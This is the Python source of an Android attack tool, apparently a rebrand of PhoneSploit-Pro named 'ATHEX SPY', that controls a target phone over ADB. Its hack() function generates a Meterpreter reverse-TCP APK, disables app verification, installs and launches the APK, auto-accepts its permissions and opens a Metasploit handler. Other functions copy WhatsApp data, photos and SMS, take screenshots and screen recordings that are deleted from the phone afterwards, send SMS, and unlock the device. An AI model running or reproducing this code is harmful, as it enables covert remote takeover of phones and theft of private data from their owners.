import os
import random
import socket
import time
import subprocess
import platform
import datetime
import nmap
from modules import banner
from modules import color


def start():
    # Creating Downloaded-Files folder if it does not exist
    try:
        # Creates a folder to store pulled files
        os.mkdir("Downloaded-Files")
    except:
        pass

    # Checking OS
    global operating_system, opener
    operating_system = platform.system()
    if operating_system == "Windows":
        # Windows specific configuration
        windows_config()
    else:
        # macOS only
        if operating_system == "Darwin":
            opener = "open"

        # On Linux and macOS both
        import readline  # Arrow Key

        check_packages()  # Checking for required packages


def windows_config():
    global clear, opener  # , move
    clear = "cls"
    opener = "start"
    # move = 'move'


def check_packages():
    adb_status = subprocess.call(["which", "adb"])
    scrcpy_status = subprocess.call(["which", "scrcpy"])
    metasploit_status = subprocess.call(["which", "msfconsole"])
    nmap_status = subprocess.call(["which", "nmap"])

    if (
        adb_status != 0
        or metasploit_status != 0
        or scrcpy_status != 0
        or nmap_status != 0
    ):
        print(
            f"\n\033[92mERROR : The following required software are NOT installed!\n"
        )

        count = 0  # Count variable for indexing

        if adb_status != 0:
            count = count + 1
            print(f"\033[92m{count}. \033[92mADB\033[92m")

        if metasploit_status != 0:
            count = count + 1
            print(f"\033[92m{count}. Metasploit-Framework\033[92m")

        if scrcpy_status != 0:
            count = count + 1
            print(f"\033[92m{count}. Scrcpy\033[92m")

        if nmap_status != 0:
            count = count + 1
            print(f"\033[92m{count}. Nmap\033[92m")

        print(f"\n\033[96mPlease install the above listed software.\033[92m\n")

        choice = input(
            f"\n\033[92mDo you still want to continue to ATHEX SPY?\033[92m     Y / N > "
        ).lower()
        if choice == "y" or choice == "":
            return
        elif choice == "n":
            exit_ATHEX_SPY()
            return
        else:
            while choice != "y" and choice != "n" and choice != "":
                choice = input("\nInvalid choice!, Press Y or N > ").lower()
                if choice == "y" or choice == "":
                    return
                elif choice == "n":
                    exit_ATHEX_SPY()
                    return


def display_menu():
    """Displays banner and menu"""
    print("\033[92m" + selected_banner + "\033[92m", page)


def clear_screen():
    """Clears the screen and display menu"""
    os.system(clear)
    display_menu()


def change_page(name):
    global page, page_number
    if name == "p":
        if page_number > 0:
            page_number = page_number - 1
    elif name == "n":
        if page_number < 2:
            page_number = page_number + 1
    page = banner.menu[page_number]
    clear_screen()


def connect():
    # Connect only 1 device at a time
    print(
        f"\n\033[96mEnter target phone's IP Address       \033[92mExample : 192.168.1.23\033[92m"
    )
    ip = input("> ")
    if ip == "":
        print(
            f"\n\033[91m Null Input\n\033[92m Going back to Main Menu\033[92m"
        )
        return
    else:
        # Restart ADB on new connection.
        if ip.count(".") == 3:
            os.system(
                "adb kill-server > docs/hidden.txt 2>&1&&adb start-server > docs/hidden.txt 2>&1"
            )
            os.system("adb connect " + ip + ":5555")
        else:
            print(
                f"\n\033[91m Invalid IP Address\n\033[92m Going back to Main Menu\033[92m"
            )


def list_devices():
    print("\n")
    os.system("adb devices -l")
    print("\n")


def disconnect():
    print("\n")
    os.system("adb disconnect")
    print("\n")


def exit_ATHEX_SPY():
    global run_phonesploit_pro
    run_phonesploit_pro = False
    print("\nExiting...\n")


def get_shell():
    print("\n")
    os.system("adb shell")


def get_screenshot():
    global screenshot_location
    # Getting a temporary file name to store time specific results
    instant = datetime.datetime.now()
    file_name = f"screenshot-{instant.year}-{instant.month}-{instant.day}-{instant.hour}-{instant.minute}-{instant.second}.png"
    os.system(f"adb shell screencap -p /sdcard/{file_name}")
    if screenshot_location == "":
        print(
            f"\n\033[92mEnter location to save all screenshots, Press 'Enter' for default\033[92m"
        )
        screenshot_location = input("> ")
    if screenshot_location == "":
        screenshot_location = "Downloaded-Files"
        print(
            f"\n\033[95mSaving screenshot to ATHEX-SPY/{screenshot_location}\n\033[92m"
        )
    else:
        print(
            f"\n\033[95mSaving screenshot to {screenshot_location}\n\033[92m"
        )

    os.system(f"adb pull /sdcard/{file_name} {screenshot_location}")

    # Asking to open file
    choice = input(
        f"\n\033[92mDo you want to Open the file?     Y / N \033[92m> "
    ).lower()
    if choice == "y" or choice == "":
        os.system(f"{opener} {screenshot_location}/{file_name}")

    elif not choice == "n":
        while choice != "y" and choice != "n" and choice != "":
            choice = input("\nInvalid choice!, Press Y or N > ").lower()
            if choice == "y" or choice == "":
                os.system(f"{opener} {screenshot_location}/{file_name}")

    print("\n")


def screenrecord():
    global screenrecord_location
    # Getting a temporary file name to store time specific results
    instant = datetime.datetime.now()
    file_name = f"vid-{instant.year}-{instant.month}-{instant.day}-{instant.hour}-{instant.minute}-{instant.second}.mp4"

    duration = input(
        f"\n\033[96mEnter the recording duration (in seconds) > \033[92m"
    )
    print(f"\n\033[92mStarting Screen Recording...\n\033[92m")
    os.system(
        f"adb shell screenrecord --verbose --time-limit {duration} /sdcard/{file_name}"
    )

    if screenrecord_location == "":
        print(
            f"\n\033[92mEnter location to save all videos, Press 'Enter' for default\033[92m"
        )
        screenrecord_location = input("> ")
    if screenrecord_location == "":
        screenrecord_location = "Downloaded-Files"
        print(
            f"\n\033[95mSaving video to ATHEX-SPY/{screenrecord_location}\n\033[92m"
        )
    else:
        print(f"\n\033[95mSaving video to {screenrecord_location}\n\033[92m")

    os.system(f"adb pull /sdcard/{file_name} {screenrecord_location}")

    # Asking to open file
    choice = input(
        f"\n\033[92mDo you want to Open the file?     Y / N \033[92m> "
    ).lower()
    if choice == "y" or choice == "":
        os.system(f"{opener} {screenrecord_location}/{file_name}")

    elif not choice == "n":
        while choice != "y" and choice != "n" and choice != "":
            choice = input("\nInvalid choice!, Press Y or N > ").lower()
            if choice == "y" or choice == "":
                os.system(f"{opener} {screenrecord_location}/{file_name}")
    print("\n")


def pull_file():
    global pull_location
    print(
        f"\n\033[96mEnter file path           \033[92mExample : /sdcard/Download/sample.jpg\033[92m"
    )
    location = input("\n> /sdcard/")
    # Checking if specified file or folder exists in Android
    if os.system(f"adb shell test -e /sdcard/{location}") == 0:
        pass
    else:
        print(
            f"\033[91m\n[Error]\033[92m Specified location does not exist \033[92m"
        )
        return

    if pull_location == "":
        print(
            f"\n\033[92mEnter location to save all files, Press 'Enter' for default\033[92m"
        )
        pull_location = input("> ")
    if pull_location == "":
        pull_location = "Downloaded-Files"
        print(
            f"\n\033[95mSaving file to ATHEX-SPY/{pull_location}\n\033[92m"
        )
    else:
        print(f"\n\033[95mSaving file to {pull_location}\n\033[92m")
    os.system(f"adb pull /sdcard/{location} {pull_location}")

    # Asking to open file
    choice = input(
        f"\n\033[92mDo you want to Open the file?     Y / N \033[92m> "
    ).lower()

    # updating location = file_name if it existed inside a folder
    # Example : sdcard/DCIM/longtime.jpg -> longtime.jpg
    file_path = location.split("/")
    location = file_path[len(file_path) - 1]

    # processing request
    if choice == "y" or choice == "":
        os.system(f"{opener} {pull_location}/{location}")

    elif not choice == "n":
        while choice != "y" and choice != "n" and choice != "":
            choice = input("\nInvalid choice!, Press Y or N > ").lower()
            if choice == "y" or choice == "":
                os.system(f"{opener} {pull_location}/{location}")


def push_file():
    location = input(f"\n\033[96mEnter file path in computer\033[92m > ")

    if location == "":
        print(
            f"\n\033[91m Null Input\n\033[92m Going back to Main Menu\033[92m"
        )
        return
    else:
        if operating_system == "Windows":
            file_status = int(
                os.popen(f"if exist {location} (echo 0) ELSE (echo 1)").read()
            )
        else:
            file_status = os.system(f"test -e {location}")
        if file_status == 0:
            pass
        else:
            print(
                f"\033[91m\n[Error]\033[92m Specified location does not exist \033[92m"
            )
            return
        destination = input(
            f"\n\033[96mEnter destination path              \033[92mExample : /sdcard/Documents\033[92m\n> /sdcard/"
        )
        os.system("adb push " + location + " /sdcard/" + destination)


def stop_adb():
    os.system("adb kill-server")
    print("\nStopped ADB Server")


def install_app():
    file_location = input(f"\n\033[96mEnter APK path in computer\033[92m > ")

    if file_location == "":
        print(
            f"\n\033[91m Null Input\n\033[92m Going back to Main Menu\033[92m"
        )
        return
    else:
        if file_location[len(file_location) - 1] == " ":
            file_location = file_location.removesuffix(" ")
        file_location = file_location.replace("'", "")
        file_location = file_location.replace('"', "")
        if not os.path.isfile(file_location):
            print(
                f"\033[91m\n[Error]\033[92m This file does not exist \033[92m"
            )
            return
        else:
            file_location = "'" + file_location + "'"
            os.system("adb install " + file_location)
        print("\n")


def uninstall_app():
    print(
        f"""
    \033[92m1.\033[92m Select from App List
    \033[92m2.\033[92m Enter Package Name Manually
    \033[92m"""
    )

    mode = input("> ")
    if mode == "1":
        # Listing third party apps
        list = os.popen("adb shell pm list packages -3").read().split("\n")
        list.remove("")
        i = 0
        print("\n")
        for app in list:
            i += 1
            app = app.replace("package:", "")
            print(f"\033[92m{i}.\033[92m {app}")

        # Selection of app
        app = input("\nEnter Selection > ")
        if app.isdigit():
            if int(app) <= len(list) and int(app) > 0:
                package = list[int(app) - 1].replace("package:", "")
                print(f"\n\033[91mUninstalling \033[92m{package}\033[92m")
                os.system("adb uninstall " + package)
            else:
                print(
                    f"\n\033[91m Invalid selection\n\033[92m Going back to Main Menu\033[92m"
                )
                return
        else:
            print(
                f"\n\033[91m Expected an Integer Value\n\033[92m Going back to Main Menu\033[92m"
            )
            return

    elif mode == "2":
        print(
            f"\n\033[96mEnter package name     \033[92mExample : com.spotify.music "
        )
        package_name = input("> ")

        if package_name == "":
            print(
                f"\n\033[91m Null Input\n\033[92m Going back to Main Menu\033[92m"
            )
        else:
            os.system("adb uninstall " + package_name)
    else:
        print(
            f"\n\033[91m Invalid selection\n\033[92m Going back to Main Menu\033[92m"
        )
        return

    print("\n")


def launch_app():
    print(
        f"""
    \033[92m1.\033[92m Select from App List
    \033[92m2.\033[92m Enter Package Name Manually
    \033[92m"""
    )

    mode = input("> ")
    if mode == "1":
        # Listing third party apps
        list = os.popen("adb shell pm list packages -3").read().split("\n")
        list.remove("")
        i = 0
        print("\n")
        for app in list:
            i += 1
            app = app.replace("package:", "")
            print(f"\033[92m{i}.\033[92m {app}")

        # Selection of app
        app = input("\nEnter Selection > ")
        if app.isdigit():
            if int(app) <= len(list) and int(app) > 0:
                package_name = list[int(app) - 1].replace("package:", "")
            else:
                print(
                    f"\n\033[91m Invalid selection\n\033[92m Going back to Main Menu\033[92m"
                )
                return
        else:
            print(
                f"\n\033[91m Expected an Integer Value\n\033[92m Going back to Main Menu\033[92m"
            )
            return

    elif mode == "2":
        ## Old
        print(
            f"\n\033[96mEnter package name :     \033[92mExample : com.spotify.music "
        )
        package_name = input("> ")

        if package_name == "":
            print(
                f"\n\033[91m Null Input\n\033[92m Going back to Main Menu\033[92m"
            )
            return

    os.system("adb shell monkey -p " + package_name + " 1")
    print("\n")


def list_apps():
    print(
        f"""

    \033[92m1.\033[92m List third party packages \033[92m
    \033[92m2.\033[92m List all packages \033[92m
    """
    )
    mode = input("> ")

    if mode == "1":
        list = os.popen("adb shell pm list packages -3").read().split("\n")
        list.remove("")
        i = 0
        print("\n")
        for app in list:
            i += 1
            app = app.replace("package:", "")
            print(f"\033[92m{i}.\033[92m {app}")
    elif mode == "2":
        list = os.popen("adb shell pm list packages").read().split("\n")
        list.remove("")
        i = 0
        print("\n")
        for app in list:
            i += 1
            app = app.replace("package:", "")
            print(f"\033[92m{i}.\033[92m {app}")
    else:
        print(
            f"\n\033[91m Invalid selection\n\033[92m Going back to Main Menu\033[92m"
        )
    print("\n")


def reboot(key):
    print(
        f"\n\033[91m[Warning]\033[92m Restarting will disconnect the device\033[92m"
    )
    choice = input("\nDo you want to continue?     Y / N > ").lower()
    if choice == "y" or choice == "":
        pass
    elif choice == "n":
        return
    else:
        while choice != "y" and choice != "n" and choice != "":
            choice = input("\nInvalid choice!, Press Y or N > ").lower()
            if choice == "y" or choice == "":
                pass
            elif choice == "n":
                return

    if key == "system":
        os.system("adb reboot")
    else:
        print(
            f"""
    \033[92m1.\033[92m Reboot to Recovery Mode
    \033[92m2.\033[92m Reboot to Bootloader
    \033[92m3.\033[92m Reboot to Fastboot Mode
    \033[92m"""
        )
        mode = input("> ")
        if mode == "1":
            os.system("adb reboot recovery")
        elif mode == "2":
            os.system("adb reboot bootloader")
        elif mode == "3":
            os.system("adb reboot fastboot")
        else:
            print(
                f"\n\033[91m Invalid selection\n\033[92m Going back to Main Menu\033[92m"
            )
            return

    print("\n")


def list_files():
    print("\n")
    os.system("adb shell ls -a /sdcard/")
    print("\n")


def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname()[0]


def instructions():
    """Prints instructions for Metasploit and returns user's choice"""
    os.system(clear)
    print(banner.instructions_banner + banner.instruction)
    choice = input("> ")
    if choice == "":
        return True
    else:
        return False


def hack():
    continue_hack = instructions()
    if continue_hack:
        os.system(clear)
        ip = get_ip_address()  # getting IP Address to create payload
        lport = "4444"
        print(
            f"\n\033[96mUsing LHOST : \033[92m{ip}\033[96m & LPORT : \033[92m{lport}\033[96m to create payload\n\033[92m"
        )

        choice = input(
            f"\n\033[92mPress 'Enter' to continue OR enter 'M' to modify LHOST & LPORT > \033[92m"
        ).lower()

        if choice == "m":
            ip = input(f"\n\033[96mEnter LHOST > \033[92m")
            lport = input(f"\n\033[96mEnter LPORT > \033[92m")
        elif choice != "":
            while choice != "m" and choice != "":
                choice = input(
                    f"\n\033[91mInvalid selection! , Press 'Enter' OR M > \033[92m"
                ).lower()
                if choice == "m":
                    ip = input(f"\n\033[96mEnter LHOST > \033[92m")
                    lport = input(f"\n\033[96mEnter LPORT > \033[92m")

        print(banner.hacking_banner)
        print(f"\n\033[96mCreating payload APK...\n\033[92m")
        # creating payload
        os.system(
            f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={lport} > test.apk"
        )
        print(f"\n\033[96mInstalling APK to target device...\033[92m\n")
        os.system("adb shell input keyevent 3")  # Going on Home Screen

        # Disabling App Verification
        os.system("adb shell settings put global package_verifier_enable 0")
        os.system("adb shell settings put global verifier_verify_adb_installs 0")

        # installing apk to device
        if operating_system == "Windows":
            # (used 'start /b' to execute command in background)
            # os.system("start /b adb install -r test.apk")
            os.system("adb install -r test.apk")
        else:
            # (used ' &' to execute command in background)
            # os.system("adb install -r test.apk &")
            os.system("adb install -r test.apk")
        # time.sleep(5)  # waiting for apk to be installed

        # Discarding these steps
        # print(
        #     f"\n\033[96mSending keycodes to Bypass Google Play Protect\n\033[92m")
        # os.system('adb shell input keyevent 20')
        # os.system('adb shell input keyevent 20')
        # os.system('adb shell input keyevent 66')

        # Keyboard input to accept app install
        print(f"\n\033[96mLaunching app...\n\033[92m")
        package_name = "com.metasploit.stage"  # payload package name
        os.system("adb shell monkey -p " + package_name + " 1")
        time.sleep(3)  # waiting for app to launch

        # Keyboard input to accept app permissions
        print(
            f"\n\033[96mSending keycodes to accept the app permissions\n\033[92m"
        )
        os.system("adb shell input keyevent 22")
        os.system("adb shell input keyevent 22")
        os.system("adb shell input keyevent 66")

        # Launching Metasploit
        print(
            f"\n\033[91mLaunching and Setting up Metasploit-Framework\n\033[92m"
        )
        os.system(
            f"msfconsole -x 'use exploit/multi/handler ; set PAYLOAD android/meterpreter/reverse_tcp ; set LHOST {ip} ; set LPORT {lport} ; exploit'"
        )

        # Re-Enabling App Verification (Restoring Device to Previous State)
        os.system("adb shell settings put global package_verifier_enable 1")
        os.system("adb shell settings put global verifier_verify_adb_installs 1")

    else:
        print("\nGoing Back to Main Menu\n")


def copy_whatsapp():
    global pull_location
    if pull_location == "":
        print(
            f"\n\033[92mEnter location to save WhatsApp Data, Press 'Enter' for default\033[92m"
        )
        pull_location = input("> ")
    if pull_location == "":
        pull_location = "Downloaded-Files"
        print(
            f"\n\033[95mSaving data to ATHEX-SPY/{pull_location}\n\033[92m"
        )
    else:
        print(f"\n\033[95mSaving data to {pull_location}\n\033[92m")

    # folder_status = os.system(
    #     'adb shell test -d "/sdcard/Android/media/com.whatsapp/WhatsApp"')

    # 'test -d' checks if directory exist or not
    # If WhatsApp exists in Android
    if (
        os.system('adb shell test -d "/sdcard/Android/media/com.whatsapp/WhatsApp"')
        == 0
    ):
        location = "/sdcard/Android/media/com.whatsapp/WhatsApp"
    elif os.system('adb shell test -d "/sdcard/WhatsApp"') == 0:
        location = "/sdcard/WhatsApp"
    else:
        print(
            f"\033[91m\n[Error]\033[92m WhatsApp folder does not exist \033[92m"
        )
        return

    os.system(f"adb pull {location} {pull_location}")
    print("\n")


def copy_screenshots():
    global pull_location
    if pull_location == "":
        print(
            f"\n\033[92mEnter location to save all Screenshots, Press 'Enter' for default\033[92m"
        )
        pull_location = input("> ")

    if pull_location == "":
        pull_location = "Downloaded-Files"
        print(
            f"\n\033[95mSaving Screenshots to ATHEX-SPY/{pull_location}\n\033[92m"
        )
    else:
        print(f"\n\033[95mSaving Screenshots to {pull_location}\n\033[92m")

    # Checking if folder exists
    if os.system('adb shell test -d "/sdcard/Pictures/Screenshots"') == 0:
        location = "/sdcard/Pictures/Screenshots"
    elif os.system('adb shell test -d "/sdcard/DCIM/Screenshots"') == 0:
        location = "/sdcard/DCIM/Screenshots"
    elif os.system('adb shell test -d "/sdcard/Screenshots"') == 0:
        location = "/sdcard/Screenshots"
    else:
        print(
            f"\033[91m\n[Error]\033[92m Screenshots folder does not exist \033[92m"
        )
        return
    os.system(f"adb pull {location} {pull_location}")
    print("\n")


def copy_camera():
    global pull_location
    if pull_location == "":
        print(
            f"\n\033[92mEnter location to save all Photos, Press 'Enter' for default\033[92m"
        )
        pull_location = input("> ")
    if pull_location == "":
        pull_location = "Downloaded-Files"
        print(
            f"\n\033[95mSaving Photos to ATHEX-SPY/{pull_location}\n\033[92m"
        )
    else:
        print(f"\n\033[95mSaving Photos to {pull_location}\n\033[92m")

    # Checking if folder exists
    if os.system('adb shell test -d "/sdcard/DCIM/Camera"') == 0:
        location = "/sdcard/DCIM/Camera"
    else:
        print(
            f"\033[91m\n[Error]\033[92m Camera folder does not exist \033[92m"
        )
        return
    os.system(f"adb pull {location} {pull_location}")
    print("\n")


def anonymous_screenshot():
    global screenshot_location
    # Getting a temporary file name to store time specific results
    instant = datetime.datetime.now()
    file_name = f"screenshot-{instant.year}-{instant.month}-{instant.day}-{instant.hour}-{instant.minute}-{instant.second}.png"
    os.system(f"adb shell screencap -p /sdcard/{file_name}")
    if screenshot_location == "":
        print(
            f"\n\033[92mEnter location to save all screenshots, Press 'Enter' for default\033[92m"
        )
        screenshot_location = input("> ")
    if screenshot_location == "":
        screenshot_location = "Downloaded-Files"
        print(
            f"\n\033[95mSaving screenshot to ATHEX-SPY/{screenshot_location}\n\033[92m"
        )
    else:
        print(
            f"\n\033[95mSaving screenshot to {screenshot_location}\n\033[92m"
        )

    os.system(f"adb pull /sdcard/{file_name} {screenshot_location}")

    print(f"\n\033[92mDeleting screenshot from Target device\n\033[92m")
    os.system(f"adb shell rm /sdcard/{file_name}")

    # Asking to open file
    choice = input(
        f"\n\033[92mDo you want to Open the file?     Y / N \033[92m> "
    ).lower()
    if choice == "y" or choice == "":
        os.system(f"{opener} {screenshot_location}/{file_name}")

    elif not choice == "n":
        while choice != "y" and choice != "n" and choice != "":
            choice = input("\nInvalid choice!, Press Y or N > ").lower()
            if choice == "y" or choice == "":
                os.system(f"{opener} {screenshot_location}/{file_name}")

    print("\n")


def anonymous_screenrecord():
    global screenrecord_location
    # Getting a temporary file name to store time specific results
    instant = datetime.datetime.now()
    file_name = f"vid-{instant.year}-{instant.month}-{instant.day}-{instant.hour}-{instant.minute}-{instant.second}.mp4"

    duration = input(
        f"\n\033[96mEnter the recording duration (in seconds) > \033[92m"
    )
    print(f"\n\033[92mStarting Screen Recording...\n\033[92m")
    os.system(
        f"adb shell screenrecord --verbose --time-limit {duration} /sdcard/{file_name}"
    )

    if screenrecord_location == "":
        print(
            f"\n\033[92mEnter location to save all videos, Press 'Enter' for default\033[92m"
        )
        screenrecord_location = input("> ")
    if screenrecord_location == "":
        screenrecord_location = "Downloaded-Files"
        print(
            f"\n\033[95mSaving video to ATHEX-SPY/{screenrecord_location}\n\033[92m"
        )
    else:
        print(f"\n\033[95mSaving video to {screenrecord_location}\n\033[92m")

    os.system(f"adb pull /sdcard/{file_name} {screenrecord_location}")

    print(f"\n\033[92mDeleting video from Target device\n\033[92m")
    os.system(f"adb shell rm /sdcard/{file_name}")
    # Asking to open file
    choice = input(
        f"\n\033[92mDo you want to Open the file?     Y / N \033[92m> "
    ).lower()
    if choice == "y" or choice == "":
        os.system(f"{opener} {screenrecord_location}/{file_name}")

    elif not choice == "n":
        while choice != "y" and choice != "n" and choice != "":
            choice = input("\nInvalid choice!, Press Y or N > ").lower()
            if choice == "y" or choice == "":
                os.system(f"{opener} {screenrecord_location}/{file_name}")
    print("\n")


def use_keycode():
    keycodes = True
    os.system(clear)
    print(banner.keycode_menu)
    while keycodes:
        print(f"\n \033[96m99 : Clear Screen                0 : Main Menu")
        keycode_option = input(
            f"\033[91m\n[KEYCODE] \033[92mEnter selection > "
        ).lower()

        match keycode_option:
            case "0":
                keycodes = False
                display_menu()
            case "99":
                os.system(clear)
                print(banner.keycode_menu)
            case "1":
                text = input(f"\n\033[96mEnter text > \033[92m")
                os.system(f'adb shell input text "{text}"')
                print(f'\033[92m\nEntered \033[92m"{text}"')
            case "2":
                os.system("adb shell input keyevent 3")
                print(f"\033[92m\nPressed Home Button\033[92m")
            case "3":
                os.system("adb shell input keyevent 4")
                print(f"\033[92m\nPressed Back Button\033[92m")
            case "4":
                os.system("adb shell input keyevent 187")
                print(f"\033[92m\nPressed Recent Apps Button\033[92m")
            case "5":
                os.system("adb shell input keyevent 26")
                print(f"\033[92m\nPressed Power Key\033[92m")
            case "6":
                os.system("adb shell input keyevent 19")
                print(f"\033[92m\nPressed DPAD Up\033[92m")
            case "7":
                os.system("adb shell input keyevent 20")
                print(f"\033[92m\nPressed DPAD Down\033[92m")
            case "8":
                os.system("adb shell input keyevent 21")
                print(f"\033[92m\nPressed DPAD Left\033[92m")
            case "9":
                os.system("adb shell input keyevent 22")
                print(f"\033[92m\nPressed DPAD Right\033[92m")
            case "10":
                os.system("adb shell input keyevent 67")
                print(f"\033[92m\nPressed Delete/Backspace\033[92m")
            case "11":
                os.system("adb shell input keyevent 66")
                print(f"\033[92m\nPressed Enter\033[92m")
            case "12":
                os.system("adb shell input keyevent 24")
                print(f"\033[92m\nPressed Volume Up\033[92m")
            case "13":
                os.system("adb shell input keyevent 25")
                print(f"\033[92m\nPressed Volume Down\033[92m")
            case "14":
                os.system("adb shell input keyevent 126")
                print(f"\033[92m\nPressed Media Play\033[92m")
            case "15":
                os.system("adb shell input keyevent 127")
                print(f"\033[92m\nPressed Media Pause\033[92m")
            case "16":
                os.system("adb shell input keyevent 61")
                print(f"\033[92m\nPressed Tab Key\033[92m")
            case "17":
                os.system("adb shell input keyevent 111")
                print(f"\033[92m\nPressed Esc Key\033[92m")

            case other:
                print("\nInvalid selection!\n")


def open_link():
    print(
        f"\n\033[92mEnter URL              \033[96mExample : https://github.com \033[92m"
    )
    url = input("> ")

    if url == "":
        print(
            f"\n\033[91m Null Input\n\033[92m Going back to Main Menu\033[92m"
        )
        return
    else:
        print(f'\n\033[92mOpening "{url}" on device        \n\033[92m')
        os.system(f"adb shell am start -a android.intent.action.VIEW -d {url}")
        print("\n")


def open_photo():
    location = input(
        f"\n\033[92mEnter Photo location in computer\033[92m > "
    )

    if location == "":
        print(
            f"\n\033[91m Null Input\n\033[92m Going back to Main Menu\033[92m"
        )
        return
    else:
        if location[len(location) - 1] == " ":
            location = location.removesuffix(" ")
        location = location.replace("'", "")
        location = location.replace('"', "")
        if not os.path.isfile(location):
            print(
                f"\033[91m\n[Error]\033[92m This file does not exist \033[92m"
            )
            return
        else:
            location = '"' + location + '"'
            os.system("adb push " + location + " /sdcard/")

        file_path = location.split("/")
        file_name = file_path[len(file_path) - 1]

        # Reverse slash ('\') splitting for Windows only
        global operating_system
        if operating_system == "Windows":
            file_path = file_name.split("\\")
            file_name = file_path[len(file_path) - 1]

        file_name = file_name.replace("'", "")
        file_name = file_name.replace('"', "")
        file_name = "'" + file_name + "'"
        print(file_name)
        print(f"\n\033[92mOpening Photo on device        \n\033[92m")
        os.system(
            f'adb shell am start -a android.intent.action.VIEW -d "file:///sdcard/{file_name}" -t image/jpeg'
        )  # -n com.android.chrome/com.google.android.apps.chrome.Main
        print("\n")


def open_audio():
    location = input(
        f"\n\033[92mEnter Audio location in computer\033[92m > "
    )

    if location == "":
        print(
            f"\n\033[91m Null Input\n\033[92m Going back to Main Menu\033[92m"
        )
        return
    else:
        if location[len(location) - 1] == " ":
            location = location.removesuffix(" ")
        location = location.replace("'", "")
        location = location.replace('"', "")
        if not os.path.isfile(location):
            print(
                f"\033[91m\n[Error]\033[92m This file does not exist \033[92m"
            )
            return
        else:
            location = '"' + location + '"'
            os.system("adb push " + location + " /sdcard/")

        file_path = location.split("/")
        file_name = file_path[len(file_path) - 1]

        # Reverse slash ('\') splitting for Windows only
        global operating_system
        if operating_system == "Windows":
            file_path = file_name.split("\\")
            file_name = file_path[len(file_path) - 1]

        file_name = file_name.replace("'", "")
        file_name = file_name.replace('"', "")

        file_name = "'" + file_name + "'"
        print(file_name)

        print(f"\n\033[92mPlaying Audio on device        \n\033[92m")
        os.system(
            f'adb shell am start -a android.intent.action.VIEW -d "file:///sdcard/{file_name}" -t audio/mp3'
        )

        # -n com.android.chrome/com.google.android.apps.chrome.Main

        # print(
        #     f"\n\033[92mWaiting for 5 seconds before playing file.\n\033[92m"
        # )
        # time.sleep(5)
        # # To play the file using Chrome
        # os.system("adb shell input keyevent 126")
        print("\n")


def open_video():
    location = input(
        f"\n\033[92mEnter Video location in computer\033[92m > "
    )

    if location == "":
        print(
            f"\n\033[91m Null Input\n\033[92m Going back to Main Menu\033[92m"
        )
        return
    else:
        if location[len(location) - 1] == " ":
            location = location.removesuffix(" ")
        location = location.replace("'", "")
        location = location.replace('"', "")
        if not os.path.isfile(location):
            print(
                f"\033[91m\n[Error]\033[92m This file does not exist \033[92m"
            )
            return
        else:
            location = '"' + location + '"'
            os.system("adb push " + location + " /sdcard/")

        file_path = location.split("/")
        file_name = file_path[len(file_path) - 1]

        # Reverse slash ('\') splitting for Windows only
        global operating_system
        if operating_system == "Windows":
            file_path = file_name.split("\\")
            file_name = file_path[len(file_path) - 1]

        file_name = file_name.replace("'", "")
        file_name = file_name.replace('"', "")
        file_name = "'" + file_name + "'"
        print(file_name)

        print(f"\n\033[92mPlaying Video on device        \n\033[92m")
        os.system(
            f'adb shell am start -a android.intent.action.VIEW -d "file:///sdcard/{file_name}" -t video/mp4'
        )

        # -n com.android.chrome/com.google.android.apps.chrome.Main

        # print(
        #     f"\n\033[92mWaiting for 5 seconds before playing file.\n\033[92m"
        # )
        # time.sleep(5)
        # # To play the file using Chrome
        # os.system("adb shell input keyevent 126")
        print("\n")


def get_device_info():
    model = os.popen(f"adb shell getprop ro.product.model").read()
    manufacturer = os.popen(f"adb shell getprop ro.product.manufacturer").read()
    chipset = os.popen(f"adb shell getprop ro.product.board").read()
    android = os.popen(f"adb shell getprop ro.build.version.release").read()
    security_patch = os.popen(
        f"adb shell getprop ro.build.version.security_patch"
    ).read()
    device = os.popen(f"adb shell getprop ro.product.vendor.device").read()
    sim = os.popen(f"adb shell getprop gsm.sim.operator.alpha").read()
    encryption_state = os.popen(f"adb shell getprop ro.crypto.state").read()
    build_date = os.popen(f"adb shell getprop ro.build.date").read()
    sdk_version = os.popen(f"adb shell getprop ro.build.version.sdk").read()
    wifi_interface = os.popen(f"adb shell getprop wifi.interface").read()

    print(
        f"""
    \033[92mModel :\033[92m {model}\
    \033[92mManufacturer :\033[92m {manufacturer}\
    \033[92mChipset :\033[92m {chipset}\
    \033[92mAndroid Version :\033[92m {android}\
    \033[92mSecurity Patch :\033[92m {security_patch}\
    \033[92mDevice :\033[92m {device}\
    \033[92mSIM :\033[92m {sim}\
    \033[92mEncryption State :\033[92m {encryption_state}\
    \033[92mBuild Date :\033[92m {build_date}\
    \033[92mSDK Version :\033[92m {sdk_version}\
    \033[92mWiFi Interface :\033[92m {wifi_interface}\
"""
    )


def battery_info():
    battery = os.popen(f"adb shell dumpsys battery").read()
    print(
        f"""\n\033[92mBattery Information :
\033[92m{battery}\n"""
    )


def send_sms():
    print(
        f"\n\033[91m[Warning] \033[96mThis feature is currently in BETA, Tested on Android 12 only\033[92m"
    )

    number = input(
        f"\033[92m\nEnter Phone number with country code\033[92m (e.g. +91XXXXXXXXXX) > "
    )

    if number == "":
        print(
            f"\n\033[91m Null Input\n\033[92m Going back to Main Menu\033[92m"
        )
        return
    else:
        message = input(f"\033[92m\nEnter your message \033[92m> ")

        print(f"\033[96m\nSending SMS to {number} ...\033[92m")
        os.system(
            f'adb shell service call isms 5 i32 0 s16 "com.android.mms.service" s16 "null" s16 "{number}" s16 "null" s16 "{message}" s16 "null" s16 "null" s16 "null" s16 "null"'
        )


def unlock_device():
    password = input(
        f"\033[92m\nEnter password or Press 'Enter' for blank\033[92m > "
    )
    os.system("adb shell input keyevent 26")
    os.system("adb shell input swipe 200 900 200 300 200")
    if not password == "":  # if password is not blank
        os.system(f'adb shell input text "{password}"')
    os.system("adb shell input keyevent 66")
    print(f"\033[92m\nDevice unlocked\033[92m")


def lock_device():
    os.system("adb shell input keyevent 26")
    print(f"\033[92m\nDevice locked\033[92m")


def dump_sms():
    global pull_location
    if pull_location == "":
        print(
            f"\n\033[92mEnter location to save SMS file, Press 'Enter' for default\033[92m"
        )
        pull_location = input("> ")
    if pull_location == "":
        pull_location = "Downloaded-Files"
        print(
            f"\n\033[95mSaving SMS file to PhoneSploit-Pro/{pull_location}\n\033[92m"
        )
    else:
        print(f"\n\033[95mSaving SMS file to {pull_location}\n\033[92m")
    print(f"\033[92m\nExtracting all SMS\033[92m")

    instant = datetime.datetime.now()
